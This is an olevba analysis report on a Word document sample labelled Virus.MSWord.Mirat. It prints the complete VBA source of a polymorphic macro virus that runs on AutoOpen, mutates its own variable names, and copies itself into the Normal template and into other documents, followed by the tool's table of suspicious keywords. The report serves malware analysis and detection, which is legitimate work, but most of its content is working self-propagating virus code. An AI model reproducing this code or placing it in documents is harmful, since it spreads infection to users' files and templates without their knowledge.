olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mirat-7f6c0217770c07532cf25e577f311c9037262a17
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mirat-7f6c0217770c07532cf25e577f311c9037262a17 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Small.bas 
in file: Virus.MSWord.Mirat-7f6c0217770c07532cf25e577f311c9037262a17 - OLE stream: 'Macros/VBA/Small'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Small_ONE virus by MI_pirat
'Uses MI_pirat's PolyMorphing Ngine
On Error Resume Next
StatusBar = "Hmmm..."
If ThisDocument.Name <> NormalTemplate.Name Then
GLDM1 = 9
ReDim CACM1(1 To GLDM1) As String
CACM1(1) = "GLDM1": CACM1(2) = "IFUM1": CACM1(3) = "FJDM1"
CACM1(4) = "CACM1": CACM1(5) = "CYXM1": CACM1(6) = "BPQM1": CACM1(7) = "TXRM1"
CACM1(8) = "CQUM1": CACM1(9) = "HPGM1"
IFUM1 = ActiveDocument.Content
ActiveDocument.Content = ""
FJDM1 = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
For TXRM1 = 1 To FJDM1
ActiveDocument.Content = ActiveDocument.Content + ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(TXRM1, 1)
Next TXRM1
For TXRM1 = 1 To GLDM1
Randomize (250)
BPQM1 = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "M1"
Set CYXM1 = ActiveDocument.Content
CYXM1.Find.Execute FindText:=CACM1(TXRM1), ReplaceWith:=BPQM1, Replace:=wdReplaceAll
Next TXRM1
FJDM1 = ActiveDocument.VBProject.VBComponents(2).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents(2).CodeModule.DeleteLines 1, FJDM1
BPQM1 = ActiveDocument.Content
ActiveDocument.VBProject.VBComponents(2).CodeModule.AddFromString BPQM1
ActiveDocument.Content = ""
ActiveDocument.Content = IFUM1
mm:
If ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(1, 1) <> "Sub AutoOpen()" Then
ActiveDocument.VBProject.VBComponents(2).CodeModule.DeleteLines 1, 1
GoTo mm
End If
End If
If Application.UserName <> "Small" Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Small", Object:=wdOrganizerObjectProjectItems
Application.UserName = "Small"
End If
Set FJDM1 = ActiveDocument.VBProject.VBComponents
For TXRM1 = 1 To FJDM1.Count
If FJDM1(TXRM1).Name = "Small" Then CQUM1 = CQUM1 + 1
Next TXRM1
If CQUM1 = 0 Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Small", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+
